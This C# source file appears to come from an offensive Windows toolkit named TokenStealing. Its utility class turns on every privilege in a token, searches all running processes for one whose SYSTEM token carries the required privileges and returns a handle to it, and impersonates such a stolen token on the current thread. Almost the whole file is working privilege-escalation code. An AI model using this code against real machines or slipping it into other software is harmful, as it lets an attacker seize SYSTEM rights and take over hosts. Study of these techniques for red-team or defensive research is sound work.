using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using TokenStealing.Interop;

namespace TokenStealing.Library
{
    using NTSTATUS = Int32;

    internal class Utilities
    {
        public static bool EnableAllTokenPrivileges(out Dictionary<string, bool> adjustedPrivs)
        {
            return EnableAllTokenPrivileges(WindowsIdentity.GetCurrent().Token, out adjustedPrivs);
        }


        public static bool EnableAllTokenPrivileges(
            IntPtr hToken,
            out Dictionary<string, bool> adjustedPrivs)
        {
            bool allEnabled;

            do
            {
                var privsToEnable = new List<string>();
                allEnabled = Helpers.GetTokenPrivileges(
                    hToken,
                    out Dictionary<string, SE_PRIVILEGE_ATTRIBUTES> availablePrivs);

                if (!allEnabled)
                {
                    adjustedPrivs = new Dictionary<string, bool>();
                    break;
                }

                foreach (var privName in availablePrivs.Keys)
                    privsToEnable.Add(privName);

                allEnabled = EnableTokenPrivileges(hToken, privsToEnable, out adjustedPrivs);
            } while (false);

            return allEnabled;
        }


        public static bool EnableTokenPrivileges(
            List<string> requiredPrivs,
            out Dictionary<string, bool> adjustedPrivs)
        {
            return EnableTokenPrivileges(
                WindowsIdentity.GetCurrent().Token,
                requiredPrivs,
                out adjustedPrivs);
        }


        public static bool EnableTokenPrivileges(
            IntPtr hToken,
            List<string> requiredPrivs,
            out Dictionary<string, bool> adjustedPrivs)
        {
            var allEnabled = true;
            adjustedPrivs = new Dictionary<string, bool>();

            do
            {
                if (requiredPrivs.Count == 0)
                    break;

                allEnabled = Helpers.GetTokenPrivileges(
                    hToken,
                    out Dictionary<string, SE_PRIVILEGE_ATTRIBUTES> availablePrivs);

                if (!allEnabled)
                    break;

                foreach (var priv in requiredPrivs)
                {
                    adjustedPrivs.Add(priv, false);

                    foreach (var available in availablePrivs)
                    {
                        if (Helpers.CompareIgnoreCase(available.Key, priv))
                        {
                            if ((available.Value & SE_PRIVILEGE_ATTRIBUTES.ENABLED) != 0)
                            {
                                adjustedPrivs[priv] = true;
                            }
                            else
                            {
                                IntPtr pTokenPrivileges = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)));
                                var tokenPrivileges = new TOKEN_PRIVILEGES(1);

                                if (NativeMethods.LookupPrivilegeValue(
                                    null,
                                    priv,
                                    out tokenPrivileges.Privileges[0].Luid))
                                {
                                    tokenPrivileges.Privileges[0].Attributes = (int)SE_PRIVILEGE_ATTRIBUTES.ENABLED;
                                    Marshal.StructureToPtr(tokenPrivileges, pTokenPrivileges, true);

                                    adjustedPrivs[priv] = NativeMethods.AdjustTokenPrivileges(
                                        hToken,
                                        false,
                                        pTokenPrivileges,
                                        Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)),
                                        IntPtr.Zero,
                                        out int _);
                                    adjustedPrivs[priv] = (adjustedPrivs[priv] && (Marshal.GetLastWin32Error() == 0));
                                }

                                Marshal.FreeHGlobal(pTokenPrivileges);
                            }

                            break;
                        }
                    }

                    if (!adjustedPrivs[priv])
                        allEnabled = false;
                }
            } while (false);

            return allEnabled;
        }


        public static IntPtr GetSystemProcessHandle(
            List<string> requiredPrivileges,
            ACCESS_MASK processAccessMask,
            ACCESS_MASK tokenAccessMask,
            out int pid,
            out string processName)
        {
            bool status;
            var hProcess = IntPtr.Zero;
            tokenAccessMask |= ACCESS_MASK.TOKEN_QUERY;
            pid = -1;
            processName = null;

            foreach (Process proc in Process.GetProcesses())
            {
                hProcess = NativeMethods.OpenProcess(processAccessMask, false, proc.Id);

                if (hProcess != IntPtr.Zero)
                {
                    status = NativeMethods.OpenProcessToken(hProcess, tokenAccessMask, out IntPtr hToken);

                    if (status)
                    {
                        bool isSystem = Helpers.IsSystem(hToken);
                        Helpers.GetTokenPrivileges(hToken, out Dictionary<string, SE_PRIVILEGE_ATTRIBUTES> privileges);
                        NativeMethods.NtClose(hToken);

                        if (isSystem)
                        {
                            var available = true;

                            foreach (var privilege in requiredPrivileges)
                            {
                                available = false;

                                foreach (var key in privileges.Keys)
                                {
                                    available = Helpers.CompareIgnoreCase(key, privilege);

                                    if (available)
                                        break;
                                }

                                if (!available)
                                    break;
                            }

                            if (available)
                            {
                                pid = proc.Id;
                                processName = proc.ProcessName;
                            }
                        }
                    }

                    if (pid == -1)
                    {
                        NativeMethods.NtClose(hProcess);
                        hProcess = IntPtr.Zero;
                    }
                    else
                    {
                        break;
                    }
                }
            }

            return hProcess;
        }


        public static bool ImpersonateThreadToken(IntPtr hImpersonationToken)
        {
            IntPtr pImpersonationLevel = Marshal.AllocHGlobal(4);
            var status = false;

            if (NativeMethods.ImpersonateLoggedOnUser(hImpersonationToken))
            {
                NTSTATUS ntstatus = NativeMethods.NtQueryInformationToken(
                    WindowsIdentity.GetCurrent().Token,
                    TOKEN_INFORMATION_CLASS.TokenImpersonationLevel,
                    pImpersonationLevel,
                    4u,
                    out uint _);

                if (ntstatus == Win32Consts.STATUS_SUCCESS)
                {
                    var level = (SECURITY_IMPERSONATION_LEVEL)Marshal.ReadInt32(pImpersonationLevel);

                    if (level == SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation)
                        status = true;
                    else if (level == SECURITY_IMPERSONATION_LEVEL.SecurityDelegation)
                        status = true;
                    else
                        status = false;
                }
            }

            Marshal.FreeHGlobal(pImpersonationLevel);

            return status;
        }
    }
}
